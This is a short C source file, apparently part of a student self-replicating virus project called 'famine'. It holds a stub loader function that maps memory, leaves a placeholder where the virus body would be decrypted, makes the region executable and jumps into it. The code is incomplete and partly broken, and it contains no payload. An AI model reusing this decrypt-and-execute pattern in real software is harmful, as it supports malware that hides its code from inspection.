//
// Created by Joris GOUNAND on 11/8/19.
//

#include "../inc/famine.h"

int decrypt(void *src_virus,size_t s_virus, void *src_pre,size_t s_pre, int key)
{
	void *dst;
	typedef long (*JittedFunc)();

	if (src_virus || s_virus || src_pre || s_pre || key)
	{;}
	dst = mmap(0, s_virus, PROT_READ|PROT_WRITE,MAP_PRIVATE,0,0);
	if (dst == (void*)-1) {
		perror("mmap");
		return -1;
	}
	//decrypt and cpy
	if (mprotect(dst, s_virus, PROT_READ | PROT_EXEC) == -1) {
		perror("mprotect");
		return -1;
	}
	JittedFunc func = dst;
	func();
	return 0;
}

